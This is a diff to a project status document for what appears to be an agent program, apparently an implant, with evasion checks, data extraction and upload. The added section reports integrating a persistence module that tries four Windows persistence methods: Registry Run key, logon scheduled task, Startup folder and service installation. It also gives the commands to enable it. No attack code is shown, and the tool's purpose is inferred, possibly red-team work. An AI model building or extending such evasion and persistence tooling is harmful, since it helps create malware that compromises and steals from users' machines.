@@ -126,11 +126,28 @@ The evasion check now runs synchronously BEFORE any other tasks:
 2. If evasion passes → orchestrator runs remaining tasks
 3. If evasion fails → program exits immediately with error
 
+### ✅ FIXED: Persistence Module Integrated
+
+Persistence is now integrated into `main.rs` and can be enabled via environment variable:
+
+**Changes made:**
+- Added persistence task registration after evasion check passes
+- Controlled by `HMM_ENABLE_PERSISTENCE=1` environment variable (disabled by default)
+- Attempts 4 persistence methods:
+  1. Registry Run key (current user, no admin required)
+  2. Scheduled task at logon
+  3. Startup folder (Windows)
+  4. Service installation (requires admin)
+- Each method logs success/failure and cleanup commands
+
+**To enable persistence:**
+```bash
+export HMM_ENABLE_PERSISTENCE=1
+./hmm_core_agent
+```
+
 ### Remaining Issues
 
-  3. Several modules exist but are not integrated into runtime flow
-      - persistence is present/exported but not invoked from main (mod.rs:4, main.rs:33).
-      - Many evasion/persistence components are effectively disconnected from actual execution path in main.
   4. Tests are strong per-module, weak for full-system behavior
       - cargo test passed (197 tests + integration suites), but tests mostly validate modules independently (processing test:85, storage test:24, transport test:19).
       - No true end-to-end test asserting that extracted records are processed, stored, and uploaded in one run.
